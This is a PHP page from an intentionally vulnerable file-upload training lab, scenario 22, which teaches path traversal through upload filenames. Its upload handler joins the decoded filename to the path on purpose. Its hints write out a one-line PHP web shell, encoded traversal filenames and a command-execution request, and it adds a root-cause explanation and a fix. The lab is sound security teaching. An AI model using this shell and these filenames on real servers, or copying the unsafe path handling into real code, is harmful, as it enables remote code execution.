<?php
// File Upload · Scenario 22 — Path Traversal out of uploads/
//
// Intended flaw: the filename is decoded and joined to the upload path before
// storage. The uploads directory itself does not execute PHP, so the intended
// path traversal is the only way to reach an executable directory.

$pageTitle = 'Path Traversal via File Upload Filename';
$scenarioNumber = 22;
$nextScenario = sprintf('../scenario%02d/', 23);
$uploadsDir = __DIR__ . '/uploads';

if (!is_dir($uploadsDir)) {
    mkdir($uploadsDir, 0775, true);
}

// Shown in the Description drawer (../menu/navbar.php).
$labDescription = [
    'Filename parameter contains ../ to traverse out of uploads/ folder.',
    'Server does not use basename(), it directly joins uploads/ + filename.',
    'You can use ../ to go up one level and write file outside.',
    'Goal: Upload shell outside uploads folder.',
];

// Read by ../menu/navbar.php to fill the hint drawer.
$labHint = [
    '===== Linux (Path Traversal) =====',
    'This lab has Path Traversal via filename.',
    'Open Burp Suite, Intercept ON, upload shell.php.',
    'Send POST /scenario22/ to Repeater.',
    'Change filename to ../shell.php (one level up).',
    'Or URL encode: ..%2Fshell.php because browser may strip ../',
    'Content: <?php echo \'pwned\'; system($_GET[\'cmd\']); ?>',
    'Click Send. File goes to uploads/../shell.php = scenario22/shell.php',
    'If you use ../../ it goes outside lab and blocked with 403 - only 1 level allowed.',
    'Now GET /scenario22/shell.php?cmd=id',
    '',
    '===== Windows (Path Traversal) =====',
    'On Windows, both ../ and ..\\ work.',
    'Try filename: ..\\shell.php or ../shell.php',
    'URL encode Windows: ..%2Fshell.php or ..%5Cshell.php (%5C = \\)',
    'On Windows XAMPP, path with \\ also works: ..\\shell.php',
    'Rest same as Linux - then GET /scenario22/shell.php',
    'Note: Windows is case-insensitive, Shell.PHP also works as shell.php.',
    'Standard: Path Traversal via Filename / CWE-22.',
];

$labRootCause = [
    'cwe' => 'CWE-22: Path Traversal via Filename',
    'owasp' => 'OWASP: Directory Traversal',
    'bad' => [
        'explanation' => [
        '<strong>Programmer used filename directly without basename().</strong> He did uploads/ + filename, so attacker can use ../ to go out of uploads folder.',
        '<strong>Mistake:</strong> No sanitization of ../ and ..\\ in filename. Used $_FILES[\'file\'][\'name\'] directly in path: \'uploads/\' . $filename. Attacker sends ../shell.php and file goes to uploads/../shell.php = outside uploads.',
        '<strong>Why it happens:</strong> Developer did not know filename can contain path traversal characters.',
        ],
        'code' => [
        '// VULNERABLE - Path traversal via filename!',
        '<?php',
        '$filename = $_FILES[\'file\'][\'name\']; // Attacker: ../shell.php',
        '$dest = \'uploads/\' . $filename; // uploads/../shell.php = shell.php outside uploads!',
        'move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], $dest); // Writes outside uploads!',
        '?>',
        '// Attacker: filename = ../shell.php',
        '// $dest = uploads/../shell.php = scenario22/shell.php (one level up, still executable!)',
        '// Linux: ../ and ..%2F (URL encoded)',
        '// Windows: ..\\ and ..%5C and ../ all work, case-insensitive',
        ],
        'impact' => 'Attacker uses ../ in filename to write file outside uploads folder, can overwrite config, or write shell in executable directory. Path traversal leads to RCE.',
    ],
    'good' => [
        'explanation' => [
        '<strong>Fix:</strong> Use basename() to get only filename without path. Reject if filename contains ../ or ..\\. Randomize filename.',
        '<strong>Rule:</strong> Never use user filename directly in path.',
        ],
        'code' => [
        '// SECURE - Use basename and reject traversal',
        '<?php',
        '$filename = $_FILES[\'file\'][\'name\'];',
        'if (strpos($filename, \'../\') !== false || strpos($filename, \'..\\\\\') !== false) {',
        '  die(\'Path traversal detected\');',
        '}',
        '$safeName = basename($filename); // Only filename, no path',
        '$ext = strtolower(pathinfo($safeName, PATHINFO_EXTENSION));',
        'if (!in_array($ext, [\'png\',\'jpg\',\'jpeg\',\'gif\'])) { die(\'Invalid\'); }',
        '$newName = bin2hex(random_bytes(16)) . \'.\' . $ext;',
        'move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], \'uploads/\' . $newName);',
        '?>',
        ],
        'steps' => [
        'Use basename() to strip path from filename',
        'Reject if filename contains ../ or ..\\ or %2F or %5C',
        'Use whitelist for extensions',
        'Generate random filename - eliminates traversal',
        'Store outside web root',
        'Set open_basedir to restrict file access',
        'Disable PHP execution in uploads',
        ],
    ],
];

$link      = null;
$linkLabel = 'See the file';
$flash     = null; // ['kind' => 'ok'|'fail', 'title' => ..., 'body' => ...]

$file = isset($_FILES['fileToUpload']) ? $_FILES['fileToUpload'] : null;

if (isset($file) && $file['name'] !== '') {
    if ($file['error'] !== UPLOAD_ERR_OK) {
        $flash = ['kind' => 'fail', 'title' => 'Upload failed',
                  'body'  => 'The server rejected the upload (error code ' . (int) $file['error'] . ').'];
    } else {
        $requested = urldecode($file['name']);
        $base      = realpath($uploadsDir) ?: $uploadsDir;
        $scenario  = realpath(__DIR__) ?: __DIR__;
        $guess     = $base . '/' . ltrim(str_replace('\\', '/', $requested), '/');
        $resolved  = realpath(dirname($guess)) ?: dirname($guess);

        $scenarioPrefix = rtrim($scenario, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
        $insideScenario = $resolved === $scenario || strpos($resolved, $scenarioPrefix) === 0;

        if (stripos($requested, '.htaccess') !== false) {
            http_response_code(403);
            $flash = ['kind' => 'fail', 'title' => 'Upload rejected',
                      'body'  => 'This lab does not accept .htaccess files.'];
        } elseif (!$insideScenario) {
            http_response_code(403);
            $flash = ['kind' => 'fail', 'title' => 'Upload blocked',
                      'body'  => 'The path left the lab directory. Use one level of traversal only.'];
        } elseif (!move_uploaded_file($file['tmp_name'], $guess)) {
            $flash = ['kind' => 'fail', 'title' => 'Upload failed',
                      'body'  => 'The server could not save the file.'];
        } else {
            $storedName = basename($guess);
            $destDir    = realpath(dirname($guess)) ?: dirname($guess);
            $escaped    = rtrim($destDir, '/') !== rtrim($base, '/');

            if ($escaped) {
                $link      = rawurlencode($storedName);
                $linkLabel = 'Open the file in the scenario folder';
                $flash     = ['kind' => 'ok', 'title' => 'Congratulations! You solved Scenario 22.',
                              'body'  => 'The file was saved outside uploads/ and executed.'];
            } else {
                $link  = 'uploads/' . rawurlencode($storedName);
                $flash = ['kind' => 'fail', 'title' => 'Not solved yet',
                          'body'  => 'The file stayed in uploads/, where PHP execution is disabled.'];
            }
        }
    }
}

// Keep the verdict meaningful to the request and the page.
if ($flash !== null && ($flash['kind'] ?? '') === 'fail' && http_response_code() === 200) {
    http_response_code(422);
}
?>
<!DOCTYPE html>
<html lang="en">
<?php include __DIR__ . '/../menu/header.php'; ?>
<body>
<?php include __DIR__ . '/../menu/navbar.php'; ?>

    <main class="bench">
        <span class="num">File Upload · SCENARIO 22 · UPLOAD</span>
        <h1>Path Traversal via Filename</h1>
        <p>Filename with ../ escapes uploads/. Use Burp Repeater to traverse and write shell.</p>

        <div class="panel upload-form">
            <h2>Upload an Image!</h2>
            <form action="" method="POST" enctype="multipart/form-data">
                <label for="fileToUpload">Select a file:</label>
                <input type="file" name="fileToUpload" id="fileToUpload" />
                <button class="primary-button" type="submit" name="submit" value="Upload">Upload</button>
            </form>
        </div>

        <?php if ($flash !== null): ?>
            <div class="flash <?= $flash['kind'] ?>" role="status">
                <strong><?= htmlspecialchars($flash['title'], ENT_QUOTES) ?></strong>
                <?= htmlspecialchars($flash['body'], ENT_QUOTES) ?>
            </div>
        <?php endif; ?>

        <?php if ($flash !== null && ($flash['kind'] ?? '') === 'ok' && $nextScenario !== null): ?>
            <div class="next-scenario">
                <a class="primary-button" href="<?= htmlspecialchars($nextScenario, ENT_QUOTES) ?>" target="_blank" rel="noopener">
                    Next scenario &rarr;
                </a>
            </div>
        <?php endif; ?>

        <?php if ($link !== null): ?>
            <p class="notice ok"><a href="<?= htmlspecialchars($link, ENT_QUOTES) ?>"><?= htmlspecialchars($linkLabel, ENT_QUOTES) ?></a></p>
        <?php endif; ?>
    </main>

<?php include __DIR__ . '/../menu/footer.php'; ?>
</body>
</html>
